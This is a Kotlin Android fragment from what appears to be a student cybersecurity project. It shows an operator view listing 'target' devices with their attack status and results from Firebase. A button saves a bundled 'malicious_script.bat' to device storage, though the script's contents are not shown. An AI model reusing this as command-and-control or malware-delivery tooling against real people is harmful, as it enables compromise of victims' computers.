package tr.com.mermela.cybersecurityfinalproject.ui.devicelist

import android.content.Context
import android.os.Bundle
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import androidx.core.view.isVisible
import androidx.fragment.app.viewModels
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import java.io.File
import java.io.FileOutputStream
import tr.com.mermela.cybersecurityfinalproject.R
import tr.com.mermela.cybersecurityfinalproject.databinding.FragmentDeviceListBinding
import tr.com.mermela.cybersecurityfinalproject.domain.AttackResult
import tr.com.mermela.cybersecurityfinalproject.domain.TargetInfo
import tr.com.mermela.cybersecurityfinalproject.ui.MainActivity
import tr.com.mermela.cybersecurityfinalproject.ui.devicedetail.DeviceDetailFragment
import tr.com.mermela.cybersecurityfinalproject.ui.devicelist.adapter.DeviceListAdapter


class DeviceListFragment : Fragment() {

    private lateinit var binding: FragmentDeviceListBinding

    private val viewModel: DeviceListViewModel by viewModels()

    private lateinit var adapter : DeviceListAdapter

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        binding = FragmentDeviceListBinding.inflate(inflater, container, false)

        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        initListener()
        loadDataFromFirebase()
    }

    private fun initListener() {
        with(binding){
            btnDownloadMalware.setOnClickListener {
                downloadFile()
            }
        }
    }


    private fun onDetailClick(targetInfo: TargetInfo){
        val bundle = Bundle().apply {
            putParcelable("targetInfo", targetInfo)
        }

        val deviceDetailFragment = DeviceDetailFragment().apply {
            arguments = bundle
        }

        (activity as MainActivity).supportFragmentManager.beginTransaction()
            .replace(R.id.fragmentContainer,deviceDetailFragment)
            .addToBackStack(null)
            .commit()
    }

    private fun loadDataFromFirebase() {
        binding.progressBar.isVisible = true
        val databaseReference = FirebaseDatabase.getInstance().getReference("client")
        databaseReference.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val usersList = mutableListOf<TargetInfo>()
                for (userSnapshot in snapshot.children) {
                    val username = userSnapshot.key ?: "Unknown"
                    val attackResult = userSnapshot.child("attack/attack_result").getValue(AttackResult::class.java)
                    val attackStatus = userSnapshot.child("attack/attack_status").getValue(String::class.java)
                    val isActive = userSnapshot.child("isActive").getValue(Boolean::class.java)
                    usersList.add(TargetInfo(username, attackResult, attackStatus, isActive))
                }
                updateRecyclerView(usersList)
                binding.progressBar.isVisible = false
            }

            override fun onCancelled(error: DatabaseError) {
                Toast.makeText(context, "Veri yüklenirken hata oluştu: ${error.message}", Toast.LENGTH_LONG).show()
                binding.progressBar.isVisible = false
            }
        })
    }

    private fun updateRecyclerView(usersList: MutableList<TargetInfo>) {
        adapter = DeviceListAdapter(usersList, ::onDetailClick)
        binding.rvDevices.adapter = adapter
    }

    private fun downloadFile() {
        val assetManager = requireContext().assets
        val fileName = "malicious_script.bat"

        val inputStream = assetManager.open(fileName)
        val outFile = File(requireContext().getExternalFilesDir(null), fileName)
        val outputStream = FileOutputStream(outFile)

        inputStream.copyTo(outputStream)

        inputStream.close()
        outputStream.close()

        Toast.makeText(context, "Dosya indirildi: ${outFile.absolutePath}", Toast.LENGTH_LONG).show()
    }

}